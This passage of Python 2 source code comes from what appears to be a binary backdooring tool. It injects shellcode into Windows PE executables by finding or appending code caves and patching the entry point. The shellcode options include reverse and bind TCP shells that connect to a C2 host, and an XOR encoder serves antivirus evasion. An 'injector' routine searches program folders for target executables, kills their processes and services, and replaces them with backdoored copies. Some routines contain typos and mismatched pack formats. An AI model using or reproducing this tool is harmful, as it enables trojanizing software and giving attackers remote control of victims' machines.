                count += op_codes[hex(CurrInstr)]
                #print "lower count", count
                break
            else:
                found_value = False

        if count >= 6 or count % 5 == 0 and count != 0:
            #print "Count", count
            break

        loop_count += 1
        if loop_count >= 100:
            print "This program's initial opCodes are not planned for"
            print "Please contact the developer."
            sys.exit(1)

    return ImpList, count


def patch_initial_instructions(fileItems, ImpList, count_bytes):
    """This function takes the fileItems dict and patches the
    executable entry point to jump to either the decoder or
    the shellcode if it is not encoded."""

    #So, you need to patch the initial instructions
    #to make sure everything is aligned.
    #You are going to use 5 bytes to jump to your code
    #cave so you need to make sure that your initial
    #instructions are covered

    f.seek(fileItems['LocOfEntryinCode'])
    #print 'VirtualStartingPoint',fileItems['VirtualStartingPoint']

    #This is the JMP command in the beginning of the
    #code entry point that jumps to the codecave
    f.write(struct.pack('=B', int('E9', 16)))
    #Each module will need to define the JMP address I can have
    #one for each type of code cave module and this could be a variable

    f.write(struct.pack('<i', fileItems['JMPtoCodeAddress']))
    #align the stack if the first OpCode+instruction is less
    #than 5 bytes fill with nops to align everything. Not a for loop.
    FrstOpCode = ImpList[0][1].keys()[0]
    #print "FrstOpCode", hex(FrstOpCode)

    if op_codes[hex(FrstOpCode)] == 7:
        if count_bytes % 5 != 0:
            f.write(struct.pack('=B', int('90', 16)))
    if op_codes[hex(FrstOpCode)] == 6:
        if count_bytes % 5 != 0:
            f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
    if op_codes[hex(FrstOpCode)] == 5:
        if count_bytes % 5 != 0:
            #f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
            pass
    if op_codes[hex(FrstOpCode)] == 4:
        if count_bytes % 5 != 0:
            f.write(struct.pack('=BB', int('90', 16)))
    if op_codes[hex(FrstOpCode)] == 3:
        if count_bytes % 5 != 0:
            f.write(struct.pack('=B', int('90', 16)))
    if op_codes[hex(FrstOpCode)] == 2:
        if count_bytes % 5 != 0:
            f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
    if op_codes[hex(FrstOpCode)] == 1:
        if count_bytes % 5 != 0:
            f.write(struct.pack('=BBB', int('90', 16),
                                int('90', 16),
                                int('90', 16)))


def resume_execution_32(ImpList):
    """
    This section of code imports the ImpList from pe32_entry_instr
    to patch the executable after shellcode execution
    """

    def opcode_return(OpCode, instr_length):
        if op_codes[hex(OpCode)] - instr_length == 1:
            return struct.pack('!B', OpCode)
        elif op_codes[hex(OpCode)] - instr_length == 2:
            return struct.pack('!H', OpCode)
        elif op_codes[hex(OpCode)] - instr_length == 3:
            return struct.pack('!BBB', OpCode)
        elif op_codes[hex(OpCode)] - instr_length == 4:
            return stuct.pack('!I', OpCode)
        elif op_codes[hex(OpCode)] - instr_length == 5:
            return stuct.pack('!BBBBB', OpCode)

    resumeExe = ''
    for item in ImpList:
        OpCode_address = item[0]
        OpCode = item[1].keys()[0]
        instruction = item[1].values()[0]
        ImpValue = item[2]
        instr_length = item[4]
        if verbose is True:
            if instruction:
                print 'instruction', hex(instruction)
            else:
                print "single opcode, no instruction"

        compliment_one, compliment_two = ones_compliment()

        if OpCode == int('E8', 16):
            resumeExe += struct.pack('=B', int('E8', 16))  # call
            resumeExe += "\x00"*4
            # POP ECX to find location
            resumeExe += struct.pack('=B', int('59', 16))
            #add ECX,10 push ECX
            resumeExe += "\x83\xC1\x16\x51"
            resumeExe += "\x25"          #
            resumeExe += compliment_one  #
            resumeExe += "\x25"          # To zero eax
            resumeExe += compliment_two  #
            resumeExe += "\x05"  # ADD
            #print ImpValue
            if ImpValue > 429467295:
                resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
            else:
                resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX, CallValue
            resumeExe += "\x50\xc3\x90\x90\x90\x90"  # PUSH EAX,RETN, NOPS*4
            ReturnTrackingAddress = item[3]
            #print 'ReturnTrackingAddress', ReturnTrackingAddress

        elif instr_length == 5:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<BBBBB", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 4:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<I", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 3:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<BBB", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 2:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<H", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 1:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<B", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 0:
            resumeExe += opcode_return(OpCode, instr_length)
            ReturnTrackingAddress = item[3]

    '''thisis the following:
    f.write('\x25\x4A\x4D\x4E\x55') #zero out EAX
    f.write('\x25\x35\x32\x31\x2A') #zero out EAX
    f.write('\x05') #Add
    f.write(struct.pack('=i', ReturnTrackingAddress))
    f.write('\x50') #push eax
    f.write('\x25\x4A\x4D\x4E\x55') #zero out EAX
    f.write('\x25\x35\x32\x31\x2A') #zero out EAX
    f.write('\xC3') # RETN
    '''
    resumeExe += "\x25"
    resumeExe += compliment_one  # zero out EAX
    resumeExe += "\x25"
    resumeExe += compliment_two  # zero out EAX
    resumeExe += "\x05"  # ADD
    resumeExe += struct.pack('=i', ReturnTrackingAddress)
    resumeExe += "\x50"  # push eax
    resumeExe += "\x25"  # zero out EAX
    resumeExe += compliment_one
    resumeExe += "\x25"  # zero out EAX
    resumeExe += compliment_two
    resumeExe += "\xC3"
    return ReturnTrackingAddress, resumeExe


def gather_file_info(filename, backdoorfile):
    """
    Gathers necessary PE header information to backdoor
    a file and returns a dict of file information called fileItems
    """
    fileItems = {}
    f = open(filename, "rb")
    s = f.seek(int('3C', 16))
    fileItems['filename'] = filename
    fileItems['dis_frm_pehdrs_sectble'] = 248
    fileItems['backdoorfile'] = backdoorfile
    fileItems['pe_header_location'] = struct.unpack('<i', f.read(4))[0]
    fileItems['ImportTableLocation'] = fileItems['pe_header_location']+208
    #print 'ImportTableLocation' ,fileItems['ImportTableLocation']
    # Start of COFF
    fileItems['COFF_Start'] = fileItems['pe_header_location']+4
    f.seek(fileItems['COFF_Start'])
    fileItems['MachineType'] = struct.unpack('<H', f.read(2))[0]
    for mactype, name in MachineTypes.iteritems():
        if int(mactype, 16) == fileItems['MachineType']:
            if verbose is True:
                print 'MachineType is:', name
    f.seek(fileItems['ImportTableLocation'])
    fileItems['IATLocInCode'] = struct.unpack('<i', f.read(4))[0]
    f.seek(fileItems['pe_header_location'] + 6, 0)
    fileItems['NumberOfSections'] = struct.unpack('<h', f.read(2))[0]
    f.seek(fileItems['pe_header_location']+4+20+16)
    fileItems['AddressOfEntryPoint'] = struct.unpack('<i', f.read(4))[0]
    f.seek(fileItems['pe_header_location']+4+20+28)
    fileItems['ImageBase'] = struct.unpack('<i', f.read(4))[0]
    f.seek(fileItems['pe_header_location']+4+20+28+28)
    fileItems['SizeOfImage'] = struct.unpack('<i', f.read(4))[0]
    f.seek(fileItems['pe_header_location'] +
           fileItems['dis_frm_pehdrs_sectble'], 0)
    fileItems['Sections'] = []
    for section in range(fileItems['NumberOfSections']):
        sectionValues = []
        sectionValues.append(f.read(8))
        #print f.read(8) #Name
        # VirtualSize
        sectionValues.append(struct.unpack('<i', f.read(4))[0])
        # VirtualAddress
        sectionValues.append(struct.unpack('<i', f.read(4))[0])
        # SizeOfRawData
        sectionValues.append(struct.unpack('<i', f.read(4))[0])
        # PointerToRawData
        sectionValues.append(struct.unpack('<i', f.read(4))[0])
        # PointerToRelocations
        sectionValues.append(struct.unpack('<i', f.read(4))[0])
        # PointerToLinenumbers
        sectionValues.append(struct.unpack('<i', f.read(4))[0])
        # NumberOfRelocations
        sectionValues.append(struct.unpack('<h', f.read(2))[0])
        # NumberOfLinenumbers
        sectionValues.append(struct.unpack('<h', f.read(2))[0])
        # SectionFlags
        sectionValues.append(struct.unpack('<i', f.read(4))[0])
        fileItems['Sections'].append(sectionValues)
    for section in fileItems['Sections']:
        if 'UPX'.lower() in section[0].lower():
            print "No support for UPX packed files... yet.."
            return
    fileItems['VirtualAddress'] = fileItems['SizeOfImage']
    #SizeOfImage is also the NewSection VirtualAddress
    f.seek(fileItems['pe_header_location'] +
           fileItems['dis_frm_pehdrs_sectble'], 0)
    fileItems['textSectionName'] = f.read(8)
    f.seek(4, 1)  # Skip to VirtualAddress
    fileItems['textVirtualAddress'] = struct.unpack('<i', f.read(4))[0]
    f.seek(4, 1)
    fileItems['textPointerToRawData'] = struct.unpack('<i', f.read(4))[0]
    fileItems['LocOfEntryinCode'] = (fileItems['AddressOfEntryPoint'] -
                                     fileItems['textVirtualAddress'] +
                                     fileItems['textPointerToRawData'])
    fileItems['VirtualStartingPoint'] = (fileItems['AddressOfEntryPoint'] +
                                         fileItems['ImageBase'])
    fileItems['OldIATLoc'] = (fileItems['pe_header_location'] +
                              fileItems['dis_frm_pehdrs_sectble'] +
                              40*fileItems['NumberOfSections'])
    f.seek(fileItems['OldIATLoc'])
    priorIMTLoc = 0
    IATexists = False
    while True:
        IMTsize = struct.unpack('<i', f.read(4))[0]
        IMTlocation = struct.unpack('<i', f.read(4))[0]
        #print 'Size', IMTsize, 'Location',IMTlocation
        if IMTsize == 0 and IMTlocation == 0:
            break
        priorIMTLoc = IMTlocation
        IATexists = True
    #print 'priorIMTLOC', priorIMTLoc, 'OldIATLoc', fileItems['OldIATLoc']
    f.seek(priorIMTLoc+fileItems['OldIATLoc'], 0)
    IATcount = 0
    test = ''
    while True:
        if IATexists is False:
            break
        #print 'length test',len(test)
        test += str(f.read(1))
        if len(test) > 3:
            test = test[1:]
        #print test
        IATcount = IATcount + 1
        if test.lower() == "dll":
            break
    #print 'IATcount' ,IATcount
    fileItems['SizeOfIAT'] = priorIMTLoc+IATcount
    f.seek(fileItems['OldIATLoc'])
    fileItems['ImportTableALL'] = f.read(fileItems['SizeOfIAT'])
    #print fileItems['SizeOfIAT']
    fileItems['NewIATLoc'] = fileItems['OldIATLoc'] + 40

    f.close()

    return fileItems


def change_section_flags(fileItems, section):
    """
    Changes the user selected section to RWE for successful execution
    """
    fileItems['newSectionFlags'] = int('e00000e0', 16)
    f.seek(fileItems['pe_header_location'] +
           fileItems['dis_frm_pehdrs_sectble'], 0)
    for _ in range(fileItems['NumberOfSections']):
        sec_name = f.read(8)
        if section in sec_name:
            f.seek(28, 1)
            f.write(struct.pack('<I', fileItems['newSectionFlags']))
            return
        else:
            f.seek(32, 1)


def create_code_cave(fileItems, shellcode, nsection):
    """
    This function creates a code cave for shellcode to hide,
    takes in the dict from gather_file_info function and
    writes to the file and returns fileItems
    """
    fileItems['NewSectionSize'] = len(shellcode) + 250  # bytes
    fileItems['SectionName'] = nsection  # less than 7 chars
    # starts at 1, place to write to file
    fileItems['filesize'] = os.stat(fileItems['filename']).st_size
    fileItems['newSectionPointerToRawData'] = fileItems['filesize']
    fileItems['VirtualSize'] = int(str(fileItems['NewSectionSize']), 16)
    fileItems['SizeOfRawData'] = fileItems['VirtualSize']
    fileItems['NewSectionName'] = "." + fileItems['SectionName']
    fileItems['newSectionFlags'] = int('e00000e0', 16)
    f.seek(fileItems['pe_header_location']+6, 0)
    f.write(struct.pack('<h', fileItems['NumberOfSections']+1))
    f.seek(16+28+28, 1)
    fileItems['NewSizeOfImage'] = (fileItems['VirtualSize'] +
                                   fileItems['SizeOfImage'])
    f.write(struct.pack('<i', fileItems['NewSizeOfImage']))
    f.seek(fileItems['ImportTableLocation'])
    if fileItems['IATLocInCode'] != 0:
        f.write(struct.pack('=i', fileItems['IATLocInCode']+40))
    f.seek(fileItems['pe_header_location'] +
           fileItems['dis_frm_pehdrs_sectble'] +
           40*fileItems['NumberOfSections'], 0)
    f.write(fileItems['NewSectionName'] +
            "\x00"*(8-len(fileItems['NewSectionName'])))
    f.write(struct.pack('<i', fileItems['VirtualSize']))
    f.write(struct.pack('<i', fileItems['SizeOfImage']))
    f.write(struct.pack('<i', fileItems['SizeOfRawData']))
    # Also CodeCave
    f.write(struct.pack('<i', fileItems['newSectionPointerToRawData']))
    if verbose is True:
        print 'New Section PointerToRawData'
        print fileItems['newSectionPointerToRawData']
    f.write(struct.pack('<i', 0))
    f.write(struct.pack('<i', 0))
    f.write(struct.pack('<i', 0))
    f.write(struct.pack('<I', fileItems['newSectionFlags']))
    f.write(fileItems['ImportTableALL'])
    f.seek(fileItems['filesize']+1, 0)  # moving to end of file
    # two different types of nops/randomize this
    nop = choice(nops)
    if nop > 144:
        f.write(struct.pack('!H', nop) * (fileItems['VirtualSize']/2))
    else:
        f.write(struct.pack('!B', nop) * (fileItems['VirtualSize']))
    fileItems['CodeCaveVirtualAddress'] = (fileItems['SizeOfImage'] +
                                           fileItems['ImageBase'])
    # This is to jump over certificates
    # that could bleed into the new section
    fileItems['buffer'] = int('200', 16)  # bytes
    fileItems['JMPtoCodeAddress'] = (fileItems['CodeCaveVirtualAddress'] -
                                     fileItems['AddressOfEntryPoint'] -
                                     fileItems['ImageBase'] - 5 +
                                     fileItems['buffer'])
    return fileItems


def find_all_caves(fileItems, shellcode_length):
    """
    This function finds all the codecaves in a inputed file.
    Prints results to screen
    """
    SIZE_CAVE_TO_FIND = shellcode_length
    Tracking = 0
    count = 0
    caveTracker = []
    caveSpecs = []
    #finds all caves over 100 or whatever you want
    #statinfo = os.stat(fileItems['filename'])
    #print statinfo.st_size
    f.seek(0)
    while True:
        try:
            s = struct.unpack("<b", f.read(1))[0]
        except:
            #print s
            #print "EOF"
            break
        if s == 0:
            if count == 0:
                BeginCave = Tracking
            elif count == 100:
                caveSpecs.append(BeginCave)
            count += 1
        else:
            if count >= SIZE_CAVE_TO_FIND:
                caveSpecs.append(Tracking)
                caveTracker.append(caveSpecs)
            count = 0
            caveSpecs = []

        Tracking += 1

    # print caveTracker
    for caves in caveTracker:

        countOfSections = 0
        for section in fileItems['Sections']:
            sectionFound = False
            # print section[0]
            # print section[3] + section[4]
            if caves[0] >= section[4] and \
               caves[1] <= (section[3] + section[4]) and \
               caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
               # and '.text' in section[0]:
                #if verbose == True:
                #    #print "test"
                print "We have a winner:", section[0]
                print '->Begin Cave', hex(caves[0])
                print '->End of Cave', hex(caves[1])
                print 'Size of Cave (int)', caves[1] - caves[0]
                print 'SizeOfRawData', hex(section[3])
                print 'PointerToRawData', hex(section[4])
                print 'End of Raw Data:', hex(section[3]+section[4])
                JMPtoCodeAddress = (section[2] + caves[0] -
                                    section[4] - 5 -
                                    fileItems['AddressOfEntryPoint'])
                #print "JMPtoCodeAddress", JMPtoCodeAddress, caves[0]
                print '*'*50
                sectionFound = True
                break
        if sectionFound is False:
            try:
                print "No section"
                print '->Begin Cave', hex(caves[0])
                print '->End of Cave', hex(caves[1])
                print 'Size of Cave (int)', caves[1] - caves[0]
                print '*'*50
            except Exception as e:
                print str(e)


def find_cave(fileItems, shellcode_length):
    """This function finds all code caves, allowing the user
    to pick the cave for injecting shellcode."""

    SIZE_CAVE_TO_FIND = shellcode_length
    Tracking = 0
    count = 0
    caveTracker = []
    caveSpecs = []
    #finds all caves over 100 or whatever you want
    #statinfo = os.stat(fileItems['filename'])
    #print statinfo.st_size
    f.seek(0)
    while True:
        try:
            s = struct.unpack("<b", f.read(1))[0]
        except:
            #print s
            #print "EOF"
            break
        if s == 0:
            if count == 0:
                BeginCave = Tracking
            elif count == 100:
                caveSpecs.append(BeginCave)
            count += 1
        else:
            if count >= SIZE_CAVE_TO_FIND:
                caveSpecs.append(Tracking)
                caveTracker.append(caveSpecs)
            count = 0
            caveSpecs = []

        Tracking += 1

    pickACave = {}

    for i, caves in enumerate(caveTracker):
        i += 1
        #print i
        countOfSections = 0
        for section in fileItems['Sections']:
            sectionFound = False
            #print section[0]
            #print section[3] + section[4]
            if caves[0] >= section[4] and \
               caves[1] <= (section[3] + section[4]) and \
               caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                if verbose is True:
                    print "Inserting code in this section:", section[0]
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print 'SizeOfRawData', hex(section[3])
                    print 'PointerToRawData', hex(section[4])
                    print 'End of Raw Data:', hex(section[3] + section[4])
                    print '*'*50
                JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                    5 - fileItems['AddressOfEntryPoint'])
                #print "JMPtoCodeAddress", JMPtoCodeAddress, caves[0]

                sectionFound = True
                # structure:(SectionName, cave begin, cave end, cave size,
                #            section begin, section end, JMPtoCodeAddress)
                #JMP location if picked
                pickACave[i] = [section[0], hex(caves[0]), hex(caves[1]),
                                caves[1] - caves[0], hex(section[4]),
                                hex(section[3]+section[4]), JMPtoCodeAddress]
                #return JMPtoCodeAddress, caves[0]
                break
        if sectionFound is False:
            if verbose is True:
                print "No section"
                print '->Begin Cave', hex(caves[0])
                print '->End of Cave', hex(caves[1])
                print 'Size of Cave (int)', caves[1] - caves[0]
                print '*'*50

            JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                5 - fileItems['AddressOfEntryPoint'])
            pickACave[i] = ["None", hex(caves[0]), hex(caves[1]),
                            caves[1] - caves[0], "None",
                            "None", JMPtoCodeAddress]

    print ("############################################################\n"
           "The following caves can be used to inject code and possibly\n"
           "continue execution. Use a number greater than the highest\n"
           "reference to append a code cave to the executable/dll versus\n"
           "using an existing code cave.\n"
           "Good luck:\n"
           "############################################################")
    for ref, details in pickACave.iteritems():
        print str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
                               "End: {5}; Cave begin: {1} End: {2}; "
                               "Cave Size: {3}".format(
                               details[0], details[1], details[2],
                               details[3], details[4], details[5],
                               details[6]))
    while True:
        selection = raw_input("Enter your selection:")
        try:
            selection = int(selection)
            print "Using selection: %s" % selection
            #returning JMPtoCodeAddress, cave[0]
            try:
                if change_access is True:
                    if pickACave[selection][0] != "None":
                        change_section_flags(fileItems,
                                             pickACave[selection][0])
                return (int(pickACave[selection][6]),
                        int(pickACave[selection][1], 16))
            except Exception as e:
                print str(e)
                print "Appending a code cave"
                return None, None
        except Exception as e:
            print str(e)


def do_thebackdoor(filename, backdoorfile, shellcode,
                   nsection, NewCodeCave=False, encoder="none"):
    """
    This function operates the sequence of all involved
    functions to perform the backdoor.
    """
    global fileItems
    fileItems = gather_file_info(filename, backdoorfile)
    fileItems['NewCodeCave'] = NewCodeCave
    if MachineTypes[hex(fileItems['MachineType'])] != "Intel x86":
        for item in fileItems:
            print item+':', fileItems[item]
        print ("This program does not support this format: %s"
               % MachineTypes[hex(fileItems['MachineType'])])
        return None

    #Creating file to backdoor
    shutil.copy2(filename, fileItems['backdoorfile'])
    global f
    f = open(fileItems['backdoorfile'], "r+b")
    #reserve space for shellcode
    if encoder == "none":
        shellcode_length = len(shellcode) + 65
    else:
        shellcode_length = len(set_encoder(encoder, shellcode)) + 65

    if fileItems['NewCodeCave'] is False:
        fileItems['JMPtoCodeAddress'], fileItems['CodeCaveLOC'] = (
            find_cave(fileItems, shellcode_length))
    else:
        fileItems['JMPtoCodeAddress'] = None

    global ImpList
    ImpList, count_bytes = pe32_entry_instr(fileItems['VirtualStartingPoint'],
                                            fileItems)

    #If you didn't find a cave, continue to create one.
    if fileItems['JMPtoCodeAddress'] is None:
        fileItems = create_code_cave(fileItems, shellcode, nsection)
        fileItems['NewCodeCave'] = True
        print "Adding a new section to the exe/dll for shellcode injection"
    #Patch the entry point
    patch_initial_instructions(fileItems, ImpList, count_bytes)

    ReturnTrackingAddress, resumeExe = resume_execution_32(ImpList)
    completeShellcode = shellcode+resumeExe
    if encoder.lower() != "none":
        completeShellcode = set_encoder(encoder, completeShellcode)
    #print "length complete shellcode", len(completeShellcode)

    #write instructions and shellcode
    if fileItems['NewCodeCave'] is True:
        f.seek(fileItems['newSectionPointerToRawData']+fileItems['buffer'])
    else:
        f.seek(fileItems['CodeCaveLOC'])
    f.write(completeShellcode)

    if verbose is True:
        for item in fileItems:
            print item+':', fileItems[item]
        print "ImpList"
        for item in ImpList:
            print item[1].keys()[0]
    print "{0} backdooring complete".format(filename)
    f.close()
    return True


def output_options(input_file, output_file=""):
    """
    Output file check.
    """
    if not output_file:
        output_file = "bd." + os.path.basename(input_file)
    return output_file
        #parser.error("You must provide an output file.")
        #sys.exit(1)


def set_encoder(ENCODER, SHELL):
    """
    Encoder check, if you have custom shellcode, you will
    need to update this section.
    """
    #print ENCODER
    if not ENCODER:
        print "You must choose a backdoor to add: (use -e)"
        for item in dir(Encoders):
            if "__" in item:
                continue
            else:
                print "   {0}".format(item)
        parser.print_help()
        sys.exit()

    if ENCODER not in dir(Encoders):
        print "The following shellcodes are available: (use -e)"
        for item in dir(Encoders):
            #print item
            if "__" in item:
                continue
            else:
                print "   {0}".format(item)
        sys.exit()

    #Init the encoder class
    encoded_shell = Encoders(ENCODER, SHELL)

    if ENCODER == "encode_xor":
        shellcode = encoded_shell.encode_xor()

    #Update below:
    #EXAMPLE
    #if ENCODER == "custom_shellcode":
    #   shellcode = encoded_shell.custom_shellcode()
    #

    return shellcode


def set_shells(SHELL, PORT, HOST=""):
    """
    This function sets the shellcode. If you have additional
    custom shellcode, update this section and the shellcode
    class.
    """
    if not SHELL:
        print "You must choose a backdoor to add: (use -s)"
        for item in dir(Shellcodes):
            if "__" in item:
                continue
            else:
                print "   {0}".format(item)
        parser.print_help()
        sys.exit()

    if SHELL not in dir(Shellcodes):
        print "The following shellcodes are available: (use -s)"
        for item in dir(Shellcodes):
            #print item
            if "__" in item:
                continue
            else:
                print "   {0}".format(item)
        sys.exit()

    shells = Shellcodes(HOST, PORT)

    if SHELL == "reverse_shell_tcp":
        if PORT:
            shellcode = shells.reverse_shell_tcp()
        else:
            print "No reverse_shell_tcp port provided -p"
            sys.exit(1)
    elif SHELL == "reverse_stager":
        if PORT:
            shellcode = shells.reverse_stager()
        else:
            print "No reverse_stager port provided -p"
            sys.exit(1)
    elif SHELL == "custom_shellcode":
        shellcode = shells.custom_shellcode()
    elif SHELL == "bind_shell_tcp":
        shellcode = shells.bind_shell_tcp()
    elif SHELL == "av_test":
        if PORT:
            shellcode = shells.av_test()
        else:
            print "No reverse_stager port provided -p"
            sys.exit(1)
    return shellcode


def injector(suffix, change_Access, SHELL, encoder, host,
             port, nsection, add_section, verbose):
    """
    The injector module will hunt and injection shellcode into
    targets that are in the list_of_targets dict.
    Data format DICT: {process_name_to_backdoor :
                       [('dependencies to kill', ),
                       'service to kill', restart=True/False],
                       }
    """
    shellcode = set_shells(SHELL, port, host)
    kill = False

    #add putty
    list_of_targets = {#'hamachi-2.exe':
                       #[('hamachi-2.exe', ), "Hamachi2Svc", True],
                       'Tcpview.exe':
                       [('Tcpview.exe',), None, True],
                       #'rpcapd.exe':
                       #[('rpcapd.exe'), None, False],
                       #'psexec.exe':
                       #[('psexec.exe,'), None, False],
                       #'vncserver.exe':
                       #[('vncserver.exe', ), 'vncserver', True],
                       # must append code cave for vmtoolsd.exe
                       #'vmtoolsd.exe':
                       #[('vmtools.exe',), 'VMTools', True],
                       #'nc.exe': [('nc.exe', ), None, False],
                       }

    os_name = os.name
    if os_name == 'nt':
        if "PROGRAMFILES(x86)" in os.environ:
            print "You have a x64 bit system"
            system_type = 64
        else:
            print "You have a 32 bit system"
            system_type = 32
    else:
        print "This works only on windows. :("
        sys.exit()
    winversion = platform.version()
    rootdir = os.path.splitdrive(sys.executable)[0]
    #print rootdir
    targetdirs = []
    excludedirs = []
    #print system_info
    winXP2003x86targetdirs = [rootdir+'\\']
    winXP2003x86excludedirs = [rootdir+'\\Windows\\',
                               rootdir+'\\RECYCLER\\']
    vista7win82012x64targetdirs = [rootdir+'\\',
                                   rootdir + '\\Program Files (x86)\\']
    vista7win82012x64excludedirs = [rootdir+'\\Program Files\\',
                                    rootdir+'\\Windows\\',
                                    rootdir+'\\RECYCLER\\']

    #need win2003, win2008, win8
    if "5.0." in winversion:
        print "OS is 2000"
        targetdirs = targetdirs+winXP2003x86targetdirs
        excludedirs = excludedirs+winXP2003x86excludedirs
    elif "5.1." in winversion:
        print "OS is XP"
        if system_type == 64:
            targetdirs.append(rootdir+'\\Program Files (x86)\\')
            excludedirs.append(vista7win82012x64excludedirs)
        else:
            targetdirs = targetdirs+winXP2003x86targetdirs
            excludedirs = excludedirs+winXP2003x86excludedirs
    elif "5.2." in winversion:
        print "OS is 2003"
        if system_type == 64:
            targetdirs.append(rootdir+'\\Program Files (x86)\\')
            excludedirs.append(vista7win82012x64excludedirs)
        else:
            targetdirs = targetdirs+winXP2003x86targetdirs
            excludedirs = excludedirs+winXP2003x86excludedirs
    elif "6.0." in winversion:
        print "OS is Vista/2008"
        if system_type == 64:
            targetdirs = targetdirs+vista7win82012x64targetdirs
            excludedirs = excludedirs+vista7win82012x64excludedirs
        else:
            targetdirs.append(rootdir+'\\Program Files\\')
            excludedirs.append(rootdir+'\\Windows\\')
    elif "6.1." in winversion:
        print "OS is Win7/2008"
        if system_type == 64:
            targetdirs = targetdirs+vista7win82012x64targetdirs
            excludedirs = excludedirs+vista7win82012x64excludedirs
        else:
            targetdirs.append(rootdir+'\\Program Files\\')
            excludedirs.append(rootdir+'\\Windows\\')
    elif "6.2." in winversion:
        print "OS is Win8/2012"
        targetdirs = targetdirs+vista7win82012x64targetdirs
        excludedirs = excludedirs+vista7win82012x64excludedirs

    #print targetdirs
    #print excludedirs
    filelist = set()
    folderCount = 0

    exclude = False
    for path in targetdirs:
        for root, subFolders, files in os.walk(path):
            for directory in excludedirs:
                if directory.lower() in root.lower():
                    #print directory.lower(), root.lower()
                    #print "Path not allowed", root
                    exclude = True
                    #print exclude
                    break
            if exclude is False:
                for _file in files:
                    f = os.path.join(root, _file)
                    for target, items in list_of_targets.iteritems():
                        if target.lower() == _file.lower():
                            #print target, f
                            print "Found the following file:", root+'\\'+_file
                            filelist.add(f)
                            #print exclude
            exclude = False

    #grab tasklist
    process_list = []
    all_process = os.popen("tasklist.exe")
    ap = all_process.readlines()
    all_process.close()
    ap.pop(0)   # remove blank line
    ap.pop(0)   # remove header line
    ap.pop(0)   # remove this ->> =======

    for process in ap:
        process_list.append(process.split())

    #print process_list
    #print filelist
    for target in filelist:
        service_target = False
        running_proc = False
        #get filename
        filename = os.path.basename(target)
        file_path = os.path.dirname(target)+'\\'
        for process in process_list:
            #print process
            for setprocess, items in list_of_targets.iteritems():
                if setprocess.lower() in target.lower():
                    #print setprocess, process
                    for item in items[0]:
                        #print item
                        if item.lower() in [x.lower() for x in process]:
                            print "Killing process:", item
                            try:
                                print process[1]
                                os.system("taskkill /F /PID %i" %
                                          int(process[1]))
                                running_proc = True
                            except Exception as e:
                                print str(e)
                    if setprocess.lower() in [x.lower() for x in process]:
                        print True, items[0], items[1]
                        if items[1] is not None:
                            print "Killing Service:", items[1]
                            try:
                                os.system('net stop %s' % items[1])
                            except Exception as e:
                                print str(e)
                            service_target = True

        time.sleep(1)
        #backdoor the targets here:
        output_file = output_options(target, target+'.bd')
        print "Backdooring:", target
        result = do_thebackdoor(target, output_file, shellcode,
                                nsection, add_section, encoder)
        if result:
            pass
        else:
            continue
        shutil.copy2(target, target+suffix)
        os.chmod(target, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
        time.sleep(1)
        try:
            os.unlink(target)
        except:
            print "unlinking error"
        time.sleep(1)
        try:
            shutil.copy2(output_file, target)
        except:
            os.system('move {0} {1}'.format(target, output_file))
        os.remove(output_file)
        print ("The original file {0} has been renamed to {1}".format(target,
               target+suffix))

        if service_target is True:
            print "items[1]:", list_of_targets[filename][1]
            os.system('net start %s' % list_of_targets[filename][1])
        elif items[2] is True and running_proc is True:
            # Todo: Need to build in a process counter and only restart that
            # number of running instances at time of process killing
            subprocess.Popen([target, ])
            print "Restarting:", target
        else:
            print "%s was not found online not restarting" % target


if __name__ == "__main__":
    print choice(menu)
    print author
    time.sleep(1)

    signal.signal(signal.SIGINT, signal_handler)

    parser = OptionParser()
    parser.add_option("-f", "--file", dest="FILE", action="store",
                      type="string",
                      help="File to backdoor")
    parser.add_option("-i", "--hostip", default="", dest="HOST",
                      action="store", type="string",
                      help="IP of the C2 for reverse connections")
    parser.add_option("-p", "--port", dest="PORT", action="store", type="int",
                      help="The port to either connect back to for reverse "
                      "shells or to listen on for bind shells")
    parser.add_option("-o", "--output-file", default="", dest="OUTPUT",
                      action="store", type="string",
                      help="The backdoor output file")
    parser.add_option("-s", "--shell", dest="SHELL", action="store",
                      type="string",
                      help="Payloads that are available for use.")
    parser.add_option("-n", "--section", default="sdata", dest="NSECTION",
                      action="store", type="string",
                      help="New section name must be "
                      "less than seven characters")
    parser.add_option("-c", "--cave", default=False, dest="CAVE",
                      action="store_true",
                      help="The cave flag will find code caves that "
                      "can be used for stashing shellcode. "
                      "This will print to all the code caves "
                      "of a specific size."
                      "The -l flag can be use with this setting.")
    parser.add_option("-d", "--directory", dest="DIR", action="store",
                      type="string",
                      help="This is the location of the files that "
                      "you want to backdoor. "
                      "You can make a directory of file backdooring faster by "
                      "forcing the attaching of a codecave "
                      "to the exe by using the -a setting.")
    parser.add_option("-v", "--verbose", default=False, dest="VERBOSE",
                      action="store_true",
                      help="For debug information output.")
    parser.add_option("-e", "--encoder", default="none", dest="ENCODER",
                      action="store", type="string",
                      help="Encoders that can help with AV evasion.")
    parser.add_option("-l", "--shell_length", default=380, dest="SHELL_LEN",
                      action="store", type="int",
                      help="For use with -c to help find code "
                      "caves of different sizes")
    parser.add_option("-a", "--add_new_section", default=False,
                      dest="ADD_SECTION", action="store_true",
